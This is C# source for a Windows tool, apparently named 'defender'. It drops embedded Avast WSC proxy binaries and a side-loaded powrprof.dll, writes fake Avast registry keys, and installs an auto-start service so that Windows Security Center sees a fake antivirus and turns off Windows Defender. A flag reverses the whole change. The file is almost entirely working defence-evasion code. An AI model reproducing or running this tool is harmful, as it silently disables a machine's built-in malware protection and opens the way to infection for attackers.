using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Gnu.Getopt;
using Microsoft.Win32;

namespace defender
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct InitContext
    {
        public enum EState : byte
        {
            On = 0,
            Off
        }

        public const int MaxNameLength = 128;
        public const string CtxPath = "ctx.bin";

        public EState State;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MaxNameLength + 1)]
        public string Name;

        public void Serialize(string name, string folder)
        {
            this.Name = name;
            string path = Path.Combine(folder, CtxPath);
            using (FileStream stream = new FileStream(path, FileMode.Create, FileAccess.Write))
            {
                byte[] buffer = new byte[Marshal.SizeOf(this)];
                IntPtr ptr = Marshal.AllocHGlobal(buffer.Length);
                try
                {
                    Marshal.StructureToPtr(this, ptr, false);
                    Marshal.Copy(ptr, buffer, 0, buffer.Length);
                    stream.Write(buffer, 0, buffer.Length);
                }
                finally
                {
                    Marshal.FreeHGlobal(ptr);
                }
            }
        }

        public void Deserialize(string folder)
        {
            string path = Path.Combine(folder, CtxPath);
            using (FileStream stream = new FileStream(path, FileMode.Open, FileAccess.Read))
            {
                byte[] buffer = new byte[Marshal.SizeOf(typeof(InitContext))];
                stream.Read(buffer, 0, buffer.Length);
                IntPtr ptr = Marshal.AllocHGlobal(buffer.Length);
                try
                {
                    Marshal.Copy(buffer, 0, ptr, buffer.Length);
                    InitContext result = (InitContext)Marshal.PtrToStructure(ptr, typeof(InitContext));
                    this = result;
                }
                finally
                {
                    Marshal.FreeHGlobal(ptr);
                }
            }
        }
    }

    class Program
    {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ControlService(IntPtr hService, uint dwControl, out SERVICE_STATUS lpServiceStatus);

        [StructLayout(LayoutKind.Sequential)]
        public struct SERVICE_STATUS
        {
            public int dwServiceType;
            public int dwCurrentState;
            public int dwControlsAccepted;
            public int dwWin32ExitCode;
            public int dwServiceSpecificExitCode;
            public int dwCheckPoint;
            public int dwWaitHint;
        }

        const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        const uint SERVICE_ALL_ACCESS = 0xF01FF;
        const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
        const uint SERVICE_AUTO_START = 0x00000002;
        const uint SERVICE_ERROR_NORMAL = 0x00000001;
        const uint SERVICE_CONTROL_STOP = 0x00000001;

        static void DeleteRegistryKeyRecursively(RegistryKey root, string subKeyPath)
        {
            using (RegistryKey key = root.OpenSubKey(subKeyPath, writable: true))
            {
                if (key != null)
                {
                    foreach (string subKeyName in key.GetSubKeyNames())
                        DeleteRegistryKeyRecursively(key, subKeyName);
                    root.DeleteSubKeyTree(subKeyPath);
                }
            }
        }

        static void ReleaseResource(string res, string dest)
        {
            var a = Assembly.GetExecutingAssembly();
            using (var s = a.GetManifestResourceStream(res))
            using (var m = new MemoryStream())
            {
                byte[] buffer = new byte[16 * 1024];
                int bytesRead;
                while ((bytesRead = s.Read(buffer, 0, buffer.Length)) > 0)
                {
                    m.Write(buffer, 0, bytesRead);
                }

                File.WriteAllBytes(dest, m.ToArray());
            }
        }

        static void SetupRegistry(string folder, bool remove)
        {
            if (!remove)
            {
                using (var reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Avast Software"))
                using (var subReg = reg.CreateSubKey("Avast"))
                {
                    subReg.CreateSubKey("properties");
                    subReg.SetValue("ProgramFolder", folder);
                }
            }
            else
                DeleteRegistryKeyRecursively(Registry.LocalMachine, "SOFTWARE\\Avast Software");
        }

        static void Start(string dir)
        {
            string name = "AvastWscReporter";

            IntPtr hSCManager = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
            if (hSCManager == IntPtr.Zero)
                return;

            IntPtr hService = CreateService(hSCManager, name, name,
                SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                string.Format("\"{0}\\wsc_proxy.exe\" /runassvc /rpcserver", dir), null, IntPtr.Zero, null, null, null);
            if (hService == IntPtr.Zero)
                hService = OpenService(hSCManager, name, SERVICE_ALL_ACCESS);

            if (hService == IntPtr.Zero)
                goto fin;

            StartService(hService, 0, null);

        fin:
            CloseServiceHandle(hService);
        }

        static void StopAndDelete(string dir)
        {
            string name = "AvastWscReporter";

            IntPtr hSCManager = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
            if (hSCManager == IntPtr.Zero)
                return;

            IntPtr hService = OpenService(hSCManager, name, SERVICE_ALL_ACCESS);
            if (hService == IntPtr.Zero)
                goto fin;

            SERVICE_STATUS serviceStatus;
            ControlService(hService, SERVICE_CONTROL_STOP, out serviceStatus);
            DeleteService(hService);

            if (dir == "C:\\Program Files\\Avast Software\\Avast")
                Directory.Delete(Path.GetDirectoryName(dir), true);
            else
                Directory.Delete(dir, true);

            fin:
            CloseServiceHandle(hService);
        }

        static void Main(string[] args)
        {
            try
            {
                string progname = Path.GetFileName(Assembly.GetExecutingAssembly().CodeBase);

                string dir = "C:\\Program Files\\Avast Software\\Avast";
                string name = "Avast Antivirus";
                int mode = -1;
                InitContext ctx = new InitContext();
                Getopt opt = new Getopt(progname, args, "d:n:rs");
                int c;
                while ((c = opt.getopt()) != -1)
                {
                    switch (c)
                    {
                        case 'd':
                            dir = opt.Optarg;
                            break;
                        case 'n':
                            name = opt.Optarg;
                            break;
                        case 'r':
                            mode = 1;
                            break;
                        case 's':
                            mode = 0;
                            break;
                        default:
                            return;
                    }
                }

                if (mode == 0)
                {
                    if (!Directory.Exists(dir))
                        Directory.CreateDirectory(dir);

                    ReleaseResource("defender.wsc.powrprof.dll", dir + "\\powrprof.dll");
                    ReleaseResource("defender.wsc.wsc.dll", dir + "\\wsc.dll");
                    ReleaseResource("defender.wsc.wsc_proxy.exe", dir + "\\wsc_proxy.exe");

                    SetupRegistry(dir, false);

                    ctx.State = InitContext.EState.On;
                    ctx.Serialize(name, dir);

                    Start(dir);

                    Console.WriteLine("disabled.");
                }
                else if (mode == 1)
                {
                    ctx.State = InitContext.EState.Off;
                    ctx.Serialize(name, dir);

                    Start(dir);

                    while (Process.GetProcessesByName("wsc_proxy").Length > 0)
                        Thread.Sleep(1000);

                    StopAndDelete(dir);

                    SetupRegistry(dir, true);

                    Console.WriteLine("re-enabled.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}